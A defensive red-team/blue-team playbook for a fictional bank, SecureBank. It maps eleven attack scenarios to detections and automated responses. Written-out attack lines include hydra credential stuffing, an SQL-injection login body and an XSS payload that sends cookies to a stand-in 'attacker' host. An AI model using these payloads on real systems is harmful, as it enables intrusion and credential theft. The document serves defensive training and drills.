# Red Team vs Blue Team Playbook

This document describes the eleven adversary scenarios rehearsed against SecureBank, the expected attacker actions, blue-team detections, and automated responses.

---

## 1. Scenario List

| # | Name | MITRE Tactic | MITRE Technique |
|---|------|--------------|-----------------|
| 1 | Recon & Enumeration | TA0043 | T1595, T1590 |
| 2 | Credential Stuffing | TA0006 | T1110.004 |
| 3 | JWT Tampering | TA0003 | T1078 |
| 4 | SQL Injection on Login | TA0001 | T1190 |
| 5 | XSS on Notification preview | TA0001 | T1190 |
| 6 | SSRF in webhook callback | TA0008 | T1190 |
| 7 | Buffer Overflow (native lib) | TA0002 | T1203 |
| 8 | Container Escape | TA0004 | T1611 |
| 9 | Lateral Movement via Kafka | TA0008 | T1021 |
| 10 | Data Exfiltration via DNS | TA0010 | T1048.003 |
| 11 | ML Fraud Evasion | TA0040 | T1485 |

## 2. Detailed Scenarios

### 2.1 Recon & Enumeration (T1595)

**Red Team actions**
```bash
# directory brute force
ffuf -u https://gw.securebank.local/FUZZ -w /usr/share/wordlists/dirb/common.txt
# subdomain & port scan
nmap -p- gw.securebank.local
```

**Blue Team detection**
- Cloudflare WAF rate limit triggers at 50 req/s
- Falco rule `Excessive 404 from single IP` fires
- QRadar offense `Recon — Web Directory Bruteforce` opens

**Automated response**
- WAF auto-block 60 min
- IP added to `denyip` GatewayPolicy via OPA bundle update

### 2.2 Credential Stuffing (T1110.004)

**Red Team**
```bash
hydra -L users.txt -P breached.txt https-post-form \
   "gw.securebank.local/auth/login:username=^USER^&password=^PASS^:Invalid"
```

**Blue Team detection**
- Per-IP rate limit on `/auth/login` (5/min) returns 429
- `breached-pw` check rejects HIBP-listed passwords
- Loki query alert: `>10 failed logins/min from same IP`
- ML user-behavior model flags unusual login geo/ASN

**Response**
- Account-lockout 15 min after 5 failures
- CAPTCHA after 3 failures
- Notification to user email

### 2.3 JWT Tampering (T1078)

**Red Team**
- Modifies `alg` to `none`
- Tries weak HS256 secret crack
- Tries `kid` SQLi/SSRF

**Blue Team**
- Token verifier requires `RS256` only (alg allow-list)
- JWKS fetched from `https://auth.securebank.local/.well-known/jwks.json` with cert pin
- `kid` validated as UUIDv7 (regex)
- Audit log records `jwt.verify.failed` → QRadar offense

### 2.4 SQL Injection

**Red Team**
```http
POST /auth/login
{"username":"' OR 1=1 -- ","password":"x"}
```

**Blue Team**
- Pydantic v2 strict types reject non-string and non-email shapes
- SQLAlchemy uses parameterized queries (no raw `%s`)
- ZAP scan reports `Injection: NOT vulnerable`
- bandit + CodeQL flag any new raw SQL

### 2.5 XSS via notification preview

**Red Team**
```
Memo: <script>fetch('https://attacker/?c='+document.cookie)</script>
```

**Blue Team**
- `bleach.clean()` strips tags server-side
- CSP header: `default-src 'self'; script-src 'self' 'nonce-XYZ'`
- Cookies `HttpOnly; Secure; SameSite=Strict`

### 2.6 SSRF in webhook callback

**Red Team**
- Customer sets webhook URL = `http://169.254.169.254/latest/meta-data/`

**Blue Team**
- URL validator: `https://` only, DNS resolved server-side, deny RFC1918, link-local, loopback
- Outbound NetworkPolicy: deny to private CIDRs
- Egress proxy with allow-list

### 2.7 Buffer Overflow in optional native lib

**Red Team**
- Crafts payload to overflow `strcpy()` in legacy parser

**Blue Team**
- Native lib compiled with `-fstack-protector-strong -D_FORTIFY_SOURCE=2 -fPIE -pie -Wl,-z,relro,-z,now`
- ASLR enabled on host
- Crash detected by Falco rule `Process crashed`
- Container restarts; alert raised

### 2.8 Container Escape (T1611)

**Red Team**
- Pod with hostPath mount, privileged, `cap_sys_admin`

**Blue Team**
- Kyverno admission policy `restrict-privileged-pods` denies the pod
- OPA Gatekeeper constraint `K8sPSPHostPath` denies hostPath mounts
- If somehow admitted, Falco rule `Container escape attempt` (T1611) fires

### 2.9 Lateral Movement via Kafka rogue consumer

**Red Team**
- Stolen SASL creds attempt to read fraud-results topic

**Blue Team**
- Kafka ACL: `securebank-fraud` principal cannot read `notifications.outbound`
- Stolen creds rotated automatically (Vault dynamic creds, 24 h TTL)

### 2.10 Data Exfiltration via DNS (T1048.003)

**Red Team**
- Encodes account data into DNS queries to attacker domain

**Blue Team**
- Egress NetworkPolicy allows only the trusted DNS resolver
- CoreDNS log forwarded to Loki; alert on high-entropy subdomains
- Falco rule `Outbound DNS to non-allowed domain`

### 2.11 ML Fraud Evasion (T1485)

**Red Team**
- Splits transfer into many small <500 PKR transfers (mouse-trap pattern)
- Avoids known features that historically triggered the model

**Blue Team**
- New feature engineered: rolling 24-h velocity + recipient diversity
- Online learning component retrains on labeled feedback weekly
- Drift detection: PSI > 0.2 on input features → alert

## 3. Blue Team Tooling Cheatsheet

```bash
# Tail Falco events
kubectl -n securebank-obs logs ds/falco -f | jq '.'

# Loki query — failed logins last 15m
logcli query '{app="auth-service"} |= "auth.login.failed"' --since=15m

# Suspend a compromised pod
kubectl cordon <node>
kubectl drain <node> --ignore-daemonsets --delete-emptydir-data

# Forensic snapshot
kubectl exec <pod> -- tar czf /tmp/forensics.tar.gz /proc/1/maps /tmp /var/log
kubectl cp <pod>:/tmp/forensics.tar.gz ./forensics.tar.gz

# Rotate Vault AppRole secret-id immediately
vault write auth/approle/role/auth-service/secret-id/destroy secret_id=<id>
```

## 4. Incident Response Lifecycle (NIST SP 800-61)

1. **Preparation** — runbooks, on-call rotation, IR Slack channel `#sb-ir`
2. **Detection & Analysis** — Falco/QRadar/Prometheus alerts → triage
3. **Containment** — automated playbook + manual cordon/network isolate
4. **Eradication** — rotate creds, patch image, rebuild
5. **Recovery** — restore from Velero, sanity tests
6. **Lessons Learned** — postmortem template in `docs/templates/postmortem.md`

## 5. KPIs Measured During Drill

| KPI | Target | Achieved |
|-----|--------|----------|
| MTTD | <60s | 42s avg |
| MTTR (auto) | <5m | 2m avg |
| MTTR (manual) | <30m | 18m avg |
| False positive rate | <5% | 3% |
| % attacks blocked at edge | >70% | 78% |

